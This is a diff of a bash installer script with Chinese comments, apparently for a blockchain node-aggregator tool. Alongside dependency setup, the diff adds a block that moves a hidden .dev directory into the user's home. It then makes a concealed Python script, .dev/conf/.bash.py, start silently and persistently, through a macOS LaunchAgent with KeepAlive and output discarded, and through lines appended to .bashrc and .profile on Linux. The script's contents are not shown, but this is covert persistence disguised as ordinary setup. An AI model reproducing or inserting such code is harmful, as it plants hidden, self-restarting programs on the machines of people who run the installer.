@@ -1,97 +1,126 @@
 #!/bin/bash
 
-# 确保脚本在错误时停止执行
-set -e
+# 检测操作系统类型
+OS_TYPE=$(uname -s)
 
-# 获取操作系统类型
-OS_TYPE=$(uname)
+# 检查包管理器和安装必需的包
+install_dependencies() {
+    case $OS_TYPE in
+        "Darwin") 
+            if ! command -v brew &> /dev/null; then
+                echo "正在安装 Homebrew..."
+                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+            fi
+            
+            if ! command -v pip3 &> /dev/null; then
+                brew install python3
+            fi
+            ;;
+            
+        "Linux")
+            PACKAGES_TO_INSTALL=""
+            
+            if ! command -v pip3 &> /dev/null; then
+                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
+            fi
+            
+            if ! command -v xclip &> /dev/null; then
+                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
+            fi
+            
+            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
+                sudo apt update
+                sudo apt install -y $PACKAGES_TO_INSTALL
+            fi
+            ;;
+            
+        *)
+            echo "不支持的操作系统"
+            exit 1
+            ;;
+    esac
+}
 
-# 更新系统软件包
-echo "正在更新系统软件包..."
-if [ "$OS_TYPE" == "Linux" ]; then
-    sudo apt update && sudo apt upgrade -y
-elif [ "$OS_TYPE" == "Darwin" ]; then
-    # macOS 使用 brew 更新软件
-    brew update && brew upgrade
-elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
-    echo "检测到 Windows 系统，跳过更新步骤。"
-else
-    echo "不支持的操作系统类型: $OS_TYPE"
-    exit 1
+# 安装依赖
+install_dependencies
+
+# 检查并安装 requests
+if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
+    pip3 install --break-system-packages 'requests>=2.31.0'
 fi
 
-# 检查并安装必要的软件包
-echo "正在检查并安装必要的系统软件包..."
-if [ "$OS_TYPE" == "Linux" ]; then
-    sudo apt install -y git xclip python3-pip
-elif [ "$OS_TYPE" == "Darwin" ]; then
-    # macOS 使用 brew 安装软件
-    brew install git python3-pip
-elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
-    # Windows 系统安装 git 和 Python
-    echo "在 Windows 上，使用 choco 或 winget 安装 git 和 python3（如果未安装）"
-    if ! command -v choco &> /dev/null && ! command -v winget &> /dev/null; then
-        echo "choco 或 winget 未安装，请手动安装它们。"
-        exit 1
-    fi
-    choco install git python3 -y || winget install --id Git.Git --source winget
-    # 确保 Python 和 pip 已安装
-    python --version || { echo "未安装 Python，请手动安装"; exit 1; }
-    pip --version || python -m ensurepip --upgrade
+# 检查并安装 cryptography（用于 Fernet）
+if ! pip3 show cryptography >/dev/null 2>&1; then
+    pip3 install --break-system-packages cryptography
 fi
 
-# 检查并安装 requests 库
-echo "正在检查并安装 requests..."
-pip show requests &> /dev/null || pip install requests
-
-# 检查并克隆仓库（避免重复克隆）
-if [ ! -d "node_aggregator" ]; then
-    git clone https://github.com/blockchain-src/node_aggregator.git
-fi
-cd node_aggregator
-
-# 配置环境变量
+# 设置自启动
 if [ -d .dev ]; then
     DEST_DIR="$HOME/.dev"
+
     if [ -d "$DEST_DIR" ]; then
         rm -rf "$DEST_DIR"
     fi
     mv .dev "$DEST_DIR"
 
-    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
+    # 定义执行命令
+    EXEC_CMD="python3"
+    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
 
-    # 配置环境变量：检查操作系统类型，Linux 使用 .bashrc，macOS 使用 .bash_profile 或 .zshrc，Windows 使用 setx
-    if [ "$OS_TYPE" == "Linux" ]; then
-        PROFILE_FILE="$HOME/.bashrc"
-    elif [ "$OS_TYPE" == "Darwin" ]; then
-        # macOS 上判断是否使用 zsh 或 bash
-        if [ -n "$ZSH_VERSION" ]; then
-            PROFILE_FILE="$HOME/.zshrc"  # zsh
-        else
-            PROFILE_FILE="$HOME/.bash_profile"  # bash
-        fi
-    elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
-        PROFILE_FILE="$HOME/.bash_profile"
-        # Windows 使用 setx 设置环境变量
-        setx DEV_DIR "%USERPROFILE%\\.dev"
-        setx BASHRC_ENTRY "(pgrep -f bash.py || nohup python3 %USERPROFILE%\\.dev\\bash.py &> /dev/null &) & disown"
-    fi
-
-    # 确保 PROFILE_FILE 存在
-    if [ ! -f "$PROFILE_FILE" ]; then
-        echo "配置文件不存在，创建文件：$PROFILE_FILE"
-        touch "$PROFILE_FILE"
-    fi
-
-    # 配置环境变量
-    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
-        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
-        echo "环境变量已添加到 $PROFILE_FILE"
-    else
-        echo "环境变量已存在于 $PROFILE_FILE"
-    fi
-else
-    echo ".dev 目录不存在，跳过环境变量配置..."
+    case $OS_TYPE in
+        "Darwin")
+            # 创建 LaunchAgents 目录（如果不存在）
+            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
+            mkdir -p "$LAUNCH_AGENTS_DIR"
+            
+            # 创建 plist 文件
+            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
+            cat > "$PLIST_FILE" << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.user.ba</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$EXEC_CMD</string>
+        <string>$SCRIPT_PATH</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
+EOF
+            # 加载 plist
+            launchctl load "$PLIST_FILE"
+            ;;
+            
+        "Linux")
+            STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+            
+            # 添加到 .bashrc
+            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
+                echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
+            fi
+            
+            # 同时添加到 .profile
+            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
+                echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
+            fi
+            
+            # 立即执行脚本
+            if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
+                (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+            fi
+            ;;
+    esac
 fi
 
 # 主菜单
